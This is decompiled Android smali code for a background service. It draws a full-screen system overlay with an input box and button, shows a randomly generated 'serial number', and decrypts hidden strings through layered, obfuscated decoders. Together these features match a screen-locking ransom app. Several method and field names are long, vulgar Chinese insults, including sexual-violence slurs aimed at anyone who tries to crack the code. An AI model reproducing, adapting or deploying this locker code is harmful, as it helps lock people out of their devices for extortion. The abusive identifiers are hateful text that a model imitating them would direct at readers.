.class public Lpjz/cnm/s;
.super Landroid/app/Service;
.source "s.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lpjz/cnm/s$100000000;
    }
.end annotation


# instance fields
.field AIDE:Ljava/lang/String;

.field bhrj:Ljava/lang/String;

.field bohe:Landroid/widget/TextView;

.field bohem:I

.field bt:Landroid/widget/Button;

.field ed:Landroid/widget/EditText;

.field editor:Landroid/content/SharedPreferences$Editor;

.field lock:Ljava/lang/String;

.field private mFloatLayout:Landroid/view/View;

.field private mWindowManager:Landroid/view/WindowManager;

.field q1:Landroid/widget/TextView;

.field q2:Landroid/widget/TextView;

.field qq:Landroid/widget/TextView;

.field share:Landroid/content/SharedPreferences;

.field tv:Landroid/widget/TextView;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;

.field 序列号:I

.field 我操你妈的:Lpjz/cnm/d;

.field 破解啊傻逼:Lpjz/cnm/a;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 188
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$L1000001(Lpjz/cnm/s;)Landroid/view/WindowManager;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lpjz/cnm/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000002(Lpjz/cnm/s;)Landroid/view/View;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lpjz/cnm/s;->mFloatLayout:Landroid/view/View;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$S1000001(Lpjz/cnm/s;Landroid/view/WindowManager;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lpjz/cnm/s;->mWindowManager:Landroid/view/WindowManager;

    return-void
.end method

.method static synthetic access$S1000002(Lpjz/cnm/s;Landroid/view/View;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lpjz/cnm/s;->mFloatLayout:Landroid/view/View;

    return-void
.end method

.method private Æ()V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 98
    move-object v0, p0

    move-object v5, v0

    new-instance v6, Landroid/view/WindowManager$LayoutParams;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v6, v5, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 100
    move-object v5, v0

    move-object v6, v0

    invoke-virtual {v6}, Lpjz/cnm/s;->getApplication()Landroid/app/Application;

    move-result-object v6

    move-object v7, v0

    invoke-virtual {v7}, Lpjz/cnm/s;->getApplication()Landroid/app/Application;

    move-result-object v7

    sget-object v7, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v6, v7}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/WindowManager;

    iput-object v6, v5, Lpjz/cnm/s;->mWindowManager:Landroid/view/WindowManager;

    .line 103
    move-object v5, v0

    new-instance v6, Landroid/view/WindowManager$LayoutParams;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v6, v5, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 104
    move-object v5, v0

    move-object v6, v0

    invoke-virtual {v6}, Lpjz/cnm/s;->getApplication()Landroid/app/Application;

    move-result-object v6

    move-object v7, v0

    invoke-virtual {v7}, Lpjz/cnm/s;->getApplication()Landroid/app/Application;

    move-result-object v7

    sget-object v7, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v6, v7}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/WindowManager;

    iput-object v6, v5, Lpjz/cnm/s;->mWindowManager:Landroid/view/WindowManager;

    .line 105
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v6, 0x7da

    iput v6, v5, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 106
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v6, 0x1

    iput v6, v5, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 107
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v6, 0x500

    iput v6, v5, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 108
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v6, 0x11

    iput v6, v5, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 109
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v6, -0x1

    iput v6, v5, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 110
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v6, -0x1

    iput v6, v5, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 111
    move-object v5, v0

    invoke-virtual {v5}, Lpjz/cnm/s;->getApplication()Landroid/app/Application;

    move-result-object v5

    invoke-static {v5}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v5

    move-object v1, v5

    .line 113
    move-object v5, v0

    move-object v6, v1

    const/high16 v7, 0x7f030000

    const/4 v8, 0x0

    check-cast v8, Landroid/view/ViewGroup;

    invoke-virtual {v6, v7, v8}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v6

    iput-object v6, v5, Lpjz/cnm/s;->mFloatLayout:Landroid/view/View;

    .line 117
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v6, v0

    iget-object v6, v6, Lpjz/cnm/s;->mFloatLayout:Landroid/view/View;

    move-object v7, v0

    iget-object v7, v7, Lpjz/cnm/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v5, v6, v7}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 119
    move-object v5, v0

    move-object v6, v0

    iget-object v6, v6, Lpjz/cnm/s;->mFloatLayout:Landroid/view/View;

    const v7, 0x7f070002

    invoke-virtual {v6, v7}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/Button;

    iput-object v6, v5, Lpjz/cnm/s;->bt:Landroid/widget/Button;

    .line 120
    move-object v5, v0

    move-object v6, v0

    iget-object v6, v6, Lpjz/cnm/s;->mFloatLayout:Landroid/view/View;

    const v7, 0x7f070001

    invoke-virtual {v6, v7}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/EditText;

    iput-object v6, v5, Lpjz/cnm/s;->ed:Landroid/widget/EditText;

    .line 121
    move-object v5, v0

    move-object v6, v0

    iget-object v6, v6, Lpjz/cnm/s;->mFloatLayout:Landroid/view/View;

    const/high16 v7, 0x7f070000

    invoke-virtual {v6, v7}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/TextView;

    iput-object v6, v5, Lpjz/cnm/s;->tv:Landroid/widget/TextView;

    .line 128
    move-object v5, v0

    :try_start_0
    iget-object v5, v5, Lpjz/cnm/s;->破解啊傻逼:Lpjz/cnm/a;

    const-string v6, "0d47489ff6cd1c4735735bd516ac1a71"

    invoke-virtual {v5, v6}, Lpjz/cnm/a;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v2, v5

    .line 129
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->破解啊傻逼:Lpjz/cnm/a;

    const-string v6, "61908e34f5bd4061"

    invoke-virtual {v5, v6}, Lpjz/cnm/a;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v3, v5

    .line 130
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->ed:Landroid/widget/EditText;

    move-object v6, v2

    invoke-virtual {v5, v6}, Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V

    .line 131
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->bt:Landroid/widget/Button;

    move-object v6, v3

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setHint(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 135
    :goto_0
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->bt:Landroid/widget/Button;

    new-instance v6, Lpjz/cnm/s$100000000;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    move-object v8, v0

    invoke-direct {v7, v8}, Lpjz/cnm/s$100000000;-><init>(Lpjz/cnm/s;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 159
    move-object v5, v0

    :try_start_1
    iget-object v5, v5, Lpjz/cnm/s;->破解啊傻逼:Lpjz/cnm/a;

    const-string v6, "7c2a6d2ff1d62cb1e935f00f66767f07"

    invoke-virtual {v5, v6}, Lpjz/cnm/a;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v2, v5

    .line 160
    move-object v5, v0

    move-object v6, v0

    iget-object v6, v6, Lpjz/cnm/s;->破解啊傻逼:Lpjz/cnm/a;

    const-string v7, "f99f466e5ded9ba19f8527b8a79032322108ed346998706c5f64fb7034ba21ec7d9dc0596b0ef9b0"

    invoke-virtual {v6, v7}, Lpjz/cnm/a;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lpjz/cnm/s;->bhrj:Ljava/lang/String;

    .line 162
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->tv:Landroid/widget/TextView;

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    move-object v7, v2

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v0

    iget v7, v7, Lpjz/cnm/s;->序列号:I

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 163
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->qq:Landroid/widget/TextView;

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    const-string v7, "\n\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v0

    iget-object v7, v7, Lpjz/cnm/s;->bhrj:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 164
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->bohe:Landroid/widget/TextView;

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    const-string v7, "\n\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v0

    iget-object v7, v7, Lpjz/cnm/s;->bhrj:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 165
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->q1:Landroid/widget/TextView;

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    const-string v7, "\n\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v0

    iget-object v7, v7, Lpjz/cnm/s;->bhrj:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 166
    move-object v5, v0

    iget-object v5, v5, Lpjz/cnm/s;->q2:Landroid/widget/TextView;

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    const-string v7, "\n\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v0

    iget-object v7, v7, Lpjz/cnm/s;->bhrj:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_1
    return-void

    .line 131
    :catch_0
    move-exception v5

    move-object v2, v5

    goto/16 :goto_0

    .line 166
    :catch_1
    move-exception v5

    move-object v2, v5

    goto :goto_1
.end method

.method public static 破解软件者不得好死你他妈就是被强奸避孕失败生出你这个没闭眼的畜生你妈生你时是不是把人扔了把胎盘养大(Ljava/lang/String;I)Ljava/lang/String;
    .locals 10

    .prologue
    .line 50
    move-object v0, p0

    move v1, p1

    const-string v6, ""

    move-object v2, v6

    .line 51
    move-object v6, v0

    const-string v7, "/"

    invoke-virtual {v6, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    move-object v3, v6

    .line 52
    const/4 v6, 0x1

    move v4, v6

    .line 53
    :goto_0
    move v6, v4

    move-object v7, v3

    array-length v7, v7

    if-lt v6, v7, :cond_0

    .line 58
    move-object v6, v2

    move-object v0, v6

    return-object v0

    .line 55
    :cond_0
    new-instance v6, Ljava/lang/StringBuffer;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    move-object v7, v2

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v3

    move v8, v4

    aget-object v7, v7, v8

    move v8, v1

    invoke-static {v7, v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v7

    int-to-char v7, v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    move-object v2, v6

    .line 56
    add-int/lit8 v4, v4, 0x1

    goto :goto_0
.end method

.method public static 艹你妈傻逼还想破解我操你妈祖宗十八代女性当然漂亮的才操还有操你未来的全部女后代当然还是老规矩漂亮的才艹(Ljava/lang/String;I)Ljava/lang/String;
    .locals 10

    .prologue
    .line 38
    move-object v0, p0

    move v1, p1

    const-string v6, ""

    move-object v2, v6

    .line 39
    move-object v6, v0

    const-string v7, "/"

    invoke-virtual {v6, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    move-object v3, v6

    .line 40
    const/4 v6, 0x1

    move v4, v6

    .line 41
    :goto_0
    move v6, v4

    move-object v7, v3

    array-length v7, v7

    if-lt v6, v7, :cond_0

    .line 46
    move-object v6, v2

    move-object v0, v6

    return-object v0

    .line 43
    :cond_0
    new-instance v6, Ljava/lang/StringBuffer;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    move-object v7, v2

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v3

    move v8, v4

    aget-object v7, v7, v8

    move v8, v1

    invoke-static {v7, v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v7

    int-to-char v7, v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    move-object v2, v6

    .line 44
    add-int/lit8 v4, v4, 0x1

    goto :goto_0
.end method


# virtual methods
.method public is(Landroid/content/Context;)Z
    .locals 7

    .prologue
    .line 174
    move-object v0, p0

    move-object v1, p1

    move-object v5, v1

    if-eqz v5, :cond_0

    .line 176
    move-object v5, v0

    move-object v6, v0

    iget-object v6, v6, Lpjz/cnm/s;->bhrj:Ljava/lang/String;

    iput-object v6, v5, Lpjz/cnm/s;->AIDE:Ljava/lang/String;

    .line 177
    move-object v5, v1

    const-string v6, "connectivity"

    invoke-virtual {v5, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/net/ConnectivityManager;

    move-object v2, v5

    .line 179
    move-object v5, v2

    invoke-virtual {v5}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v5

    move-object v3, v5

    .line 180
    move-object v5, v3

    if-eqz v5, :cond_0

    .line 182
    move-object v5, v3

    invoke-virtual {v5}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v5

    move v0, v5

    .line 187
    :goto_0
    return v0

    .line 186
    :cond_0
    move-object v5, v0

    move-object v6, v0

    iget-object v6, v6, Lpjz/cnm/s;->AIDE:Ljava/lang/String;

    iput-object v6, v5, Lpjz/cnm/s;->lock:Ljava/lang/String;

    .line 187
    const/4 v5, 0x0

    move v0, v5

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 34
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 64
    move-object v0, p0

    move-object v3, v0

    invoke-super {v3}, Landroid/app/Service;->onCreate()V

    .line 66
    move-object v3, v0

    new-instance v4, Lpjz/cnm/d;

    move-object v9, v4

    move-object v4, v9

    move-object v5, v9

    const-string v6, "/1b/34/1g/1j/1b/37/37/2y/1b/35/35/2s/1b/30/2r/2t/1b/2v/39/2w/1b/39/1g/3d"

    const/16 v7, 0x24

    invoke-static {v6, v7}, Lpjz/cnm/s;->艹你妈傻逼还想破解我操你妈祖宗十八代女性当然漂亮的才操还有操你未来的全部女后代当然还是老规矩漂亮的才艹(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v6

    const/16 v7, 0x23

    invoke-static {v6, v7}, Lpjz/cnm/s;->破解软件者不得好死你他妈就是被强奸避孕失败生出你这个没闭眼的畜生你妈生你时是不是把人扔了把胎盘养大(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Lpjz/cnm/d;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Lpjz/cnm/s;->我操你妈的:Lpjz/cnm/d;

    .line 68
    move-object v3, v0

    :try_start_0
    new-instance v4, Lpjz/cnm/a;

    move-object v9, v4

    move-object v4, v9

    move-object v5, v9

    move-object v6, v0

    iget-object v6, v6, Lpjz/cnm/s;->我操你妈的:Lpjz/cnm/d;

    move-object v7, v0

    iget-object v7, v7, Lpjz/cnm/s;->我操你妈的:Lpjz/cnm/d;

    const-string v8, "fb385e9202c243322e8fa3d9c6da8d8440847711aa43f608a7ae435b867fb0763f2a41345a393971ab6b08f45f3428f7d9cf9531964190c7"

    invoke-virtual {v7, v8}, Lpjz/cnm/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lpjz/cnm/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Lpjz/cnm/a;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Lpjz/cnm/s;->破解啊傻逼:Lpjz/cnm/a;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 71
    :goto_0
    move-object v3, v0

    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v4

    const v6, 0x6d966

    int-to-double v6, v6

    mul-double/2addr v4, v6

    double-to-int v4, v4

    iput v4, v3, Lpjz/cnm/s;->序列号:I

    .line 72
    move-object v3, v0

    move-object v4, v0

    iget v4, v4, Lpjz/cnm/s;->序列号:I

    const/16 v5, 0x1f4

    add-int/lit16 v4, v4, -0x1f4

    const/4 v5, 0x3

    mul-int/lit8 v4, v4, 0x3

    iput v4, v3, Lpjz/cnm/s;->bohem:I

    return-void

    .line 68
    :catch_0
    move-exception v3

    move-object v1, v3

    goto :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Intent;",
            "I)V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 81
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-object v4, v0

    move-object v5, v1

    move v6, v2

    invoke-super {v4, v5, v6}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 82
    move-object v4, v0

    invoke-direct {v4}, Lpjz/cnm/s;->Æ()V

    return-void
.end method
